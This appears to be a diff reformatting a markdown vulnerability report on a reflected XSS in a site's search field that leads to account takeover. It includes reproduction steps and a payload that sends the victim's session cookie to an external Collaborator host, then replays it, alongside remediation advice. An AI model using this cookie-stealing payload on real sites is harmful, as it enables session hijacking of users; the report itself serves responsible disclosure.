@@ -8,12 +8,14 @@ Reflected XSS to Account Takeover
 The search functionality executes injected JavaScript in the user's browser. The proof of concept shows that the PHPSESSID cookie is accessible to JavaScript and can be sent to an external server, allowing the session to be reused.
 ## Steps to Reproduce
 <!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
-1. Visit the affected URL and click Join.
+1. Visit the affected URL and click **Join**.
 2. Register and sign in to a test account.
-3. Enter the payload shown below in the search field and submit it.
-    ``'"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>``
-4. Check Burp Collaborator for an HTTP interaction containing the test account's PHPSESSID in the request path.
-5. Set the captured PHPSESSID cookie in a separate browser and refresh the site. The test account is displayed.
+3. Enter the following payload in the search field and submit it:
+   ```html
+   '"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>
+   ```
+4. Check Burp Collaborator for an HTTP interaction containing the test account's `PHPSESSID` in the request path.
+5. Set the captured `PHPSESSID` cookie in a separate browser and refresh the site. The test account is displayed.
 
 ## POC (Proof of Concept)
 <!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
@@ -47,7 +49,7 @@ An attacker who causes a victim to execute the payload could steal a JavaScript-
 ## Remediation
 <!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
 1. Apply context-appropriate output encoding to search input before rendering it.
-2. Avoid inserting untrusted input into HTML using unsafe APIs such as document.write.
-3. Set session cookies with HttpOnly, Secure, and an appropriate SameSite attribute.
+2. Avoid inserting untrusted input into HTML using unsafe APIs such as `document.write`.
+3. Set session cookies with `HttpOnly`, `Secure`, and an appropriate `SameSite` attribute.
 4. Implement a restrictive Content Security Policy as defense in depth.
 5. Invalidate exposed sessions and rotate session identifiers.
